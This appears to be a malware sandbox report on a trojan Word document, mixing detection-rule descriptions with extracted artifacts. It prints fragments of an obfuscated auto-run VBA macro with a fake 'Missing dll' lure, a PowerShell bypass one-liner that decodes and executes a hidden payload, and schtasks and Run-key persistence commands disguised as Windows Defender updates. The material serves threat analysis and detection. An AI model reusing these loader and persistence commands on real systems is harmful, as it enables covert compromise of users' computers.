threat_severity.level_description: Severity HIGH because it was considered trojan. Other contributing factor was that it could not be run in sandboxes.

Option Explicit

MsgBox (" *******  Missing dll  ******* " & vbCrLf & "Restart Your PC to Complete the Process")
End Sub

Sub Document_Open()
On Error Resume Next


Dim cZkg, hDWS, eHyR As String
cZkg = Ttbi(QYYM)
hDWS = Ttbi(bNdl)
eHyR = Ttbi(QloH)


Dim jNxm As String
jNxm = JwHb(oLNd(128, 211))
jNxm = uFUn(jNxm, JwHb(oLNd(246, 149)))
jNxm = uFUn(jNxm, JwHb(oLNd(201, 187)))
jNxm = uFUn(jNxm, JwHb(oLNd(208, 185)))
jNxm = uFUn(jNxm, JwHb(oLNd(218, 170)))

jNxm = uFUn(jNxm, JwHb(oLNd(76, 56))

Public Function wmVW(mrJi As String, MhQA As String, tAzM As String)
    Dim pXeo As Object
    Set pXeo = CreateObject(tAzM)
    Dim eHyR As Object

    Set eHyR = pXeo.CreateTextFile(mrJi, True, True)
    eHyR.Write MhQA
    eHyR.Close
End Function

crowdsourced_yara_results.description: This signature detects an office document with an embedded VBA project. While this is fairly common it is sometimes used for malicious intent.
crowdsourced_yara_results.author: InQuest Labs

sigma_analysis_results.rule_description: Detects the creation of files with an executable or script extension by an Office application.

match_context.values: @{RuleName=DLL; Image=C:\Program Files\Microsoft Office\Office16\WINWORD.EXE; EventID=11; TargetFilename=C:\ProgramData\EventManager.dll}

sigma_analysis_results.rule_title: Windows Shell/Scripting Processes Spawning Suspicious Programs
sigma_analysis_results.rule_description: Detects suspicious child processes of a Windows shell and scripting processes such as wscript, rundll32, powershell, mshta...etc.

sigma_analysis_results.rule_title: Suspicious DNS Query for IP Lookup Service APIs
sigma_analysis_results.rule_description: Detects DNS queries for IP lookup services such as "api.ipify.org" originating from a non browser process.

sigma_analysis_results.rule_title: Usage Of Web Request Commands And Cmdlets - ScriptBlock
sigma_analysis_results.rule_description: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs
Detects execution of "rundll32.exe" with a parent process of Explorer.exe. This has been observed by variants of Raspberry Robin, as first reported by Red Canary.

match_context.values: @{Product=Microsoft® Windows® Operating System; CurrentDirectory=C:\windows\system32\; OriginalFileName=RUNDLL32.EXE; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; Description=Windows host process (Rundll32); FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\windows\system32\rundll32.exe" advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,; EventID=1; ParentImage=C:\Windows\explorer.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\rundll32.exe; Company=Microsoft Corporation}

@{Product=Microsoft\xae Windows\xae Operating System; CurrentDirectory=C:\windows\system32\; OriginalFileName=RUNDLL32.EXE; Hashes=MD5=73C519F050C20580F8A62C849D49215A,SHA256=38847DC4C82C0775E7DAFCBC7FEA50749CDAC7B50AB8602E8FDFAD4401954C87,IMPHASH=F27A7FC3A53E74F45BE370131953896A; Description=Windows host process (Rundll32); EventID=1; ParentCommandLine=C:\Windows\Explorer.EXE; CommandLine="C:\windows\system32\rundll32.exe" advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\explorer.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\rundll32.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may employ various system checks to detect and avoid virtualization and analysis environments.
This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox
Detects modification of autostart extensibility point (ASEP) in registry.
sigma_analysis_results.rule_author: Victor Sergeev, Daniil Yugoslavskiy, Gleb Sukhodolskiy, Timur Zinniatullin, oscd.community, Tim Shelton, frack113 (split)

match_context.values: @{RuleName=T1060,RunKey; Details=c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,; EventID=13; Image=C:\Windows\system32\wbem\wmiprvse.exe; EventType=SetValue; TargetObject=HKU\S-1-5-21-1015118539-3749460369-599379286-1001\Software\Microsoft\Windows\CurrentVersion\Run\WindowsDefenderUpdater}

@{RuleName=T1060,RunKey; Details=c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1,; EventType=SetValue; Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; EventID=13; TargetObject=HKU\S-1-5-21-1015118539-3749460369-599379286-1001\Software\Microsoft\Windows\CurrentVersion\Run\91272042-DF6B-D1DE-F88D-F610D52D9887}

sigma_analysis_results.rule_description: Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework
sigma_analysis_results.rule_author: Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)

sigma_analysis_results.rule_title: Recon Command Output Piped To Findstr.EXE
sigma_analysis_results.rule_description:
Detects the execution of a potential recon command where the results are piped to "findstr". This is meant to trigger on inline calls of "cmd.exe" via the "/c" or "/k" for example.
Attackers often time use this technique to extract specific information they require in their reconnaissance phase.

match_context.values: @{Product=Microsoft® Windows® Operating System; CurrentDirectory=C:\Program Files (x86)\AutoIt3\; OriginalFileName=Cmd.Exe; Hashes=MD5=F3BDBE3BB6F734E357235F4D5898582D,SHA256=3685495D051137B1C4EFDE22C26DF0883614B6453B762FA84588DA55ED2E7744,IMPHASH=0AF8419BE362159398343D7B31721726; Description=Windows Command Processor; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine="C:\Program Files (x86)\AutoIt3\AutoIt3.exe" "C:\Users\george\Desktop\script.0.au3"; CommandLine=C:\Windows\system32\cmd.exe /c tasklist /svc | find "svchost.exe" >> \\192.168.2.1\joe-office-g4-17\logs\services.log; EventID=1; ParentImage=C:\Program Files (x86)\AutoIt3\AutoIt3.exe; IntegrityLevel=High; Image=C:\Windows\SysWOW64\cmd.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_title: Suspicious Schtasks Schedule Type With High Privileges
sigma_analysis_results.rule_description: Detects scheduled task creations or modification to be run with high privileges on a suspicious schedule type

match_context.values: @{Hashes=MD5=838D346D1D28F00783B7A6C6BD03A0DA,SHA256=8BE433049CCC271F04A8E625E9FB9BD3BCF15B4EDEB63497C00BD9CE1CD5C50E,IMPHASH=7EE4BC5589713B3470B8A950256E2E69; CurrentDirectory=C:\; OriginalFileName=schtasks.exe; Product=Microsoft\xae Windows\xae Operating System; Description=Task Scheduler Configuration Tool; EventID=1; ParentCommandLine=powershell.exe -exec Bypass -c $s=(get-content C:\\ProgramData\\WindowsDefenderService.ini);$d = @();$v = 0;$c = 0;while($c -ne $s.length){$v=($v*52)+([Int32][char]$s[$c]-40);if((($c+1)%3) -eq 0){while($v -ne 0){$vv=$v%256;if($vv -gt 0){$d+=[char][Int32]$vv}$v=[Int32]($v/256)}}$c+=1;};[array]::Reverse($d);iex([String]::Join('',$d));; CommandLine="C:\Windows\system32\schtasks.exe" /Create /RU system /SC ONLOGON /TN Microsoft\WindowsDefenderUpdater /TR "c:\windows\system32\rundll32.exe advpack.dll,LaunchINFSection C:\ProgramData\EventManager.logs,Defender,1," /F; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe; IntegrityLevel=Medium; Image=C:\Windows\System32\schtasks.exe; Company=Microsoft Corporation}

sigma_analysis_results.rule_description:
Adversaries may attempt to take screen captures of the desktop to gather information over the course of an operation.
Screen capturing functionality may be included as a feature of a remote access tool used in post-compromise operations

sigma_analysis_results.rule_title: Potential Encoded PowerShell Patterns In CommandLine
sigma_analysis_results.rule_description: Detects specific combinations of encoding methods in PowerShell via the commandline
sigma_analysis_results.rule_author: Teymur Kheirkhabarov (idea), Vasiliy Burov (rule), oscd.community, Tim Shelton
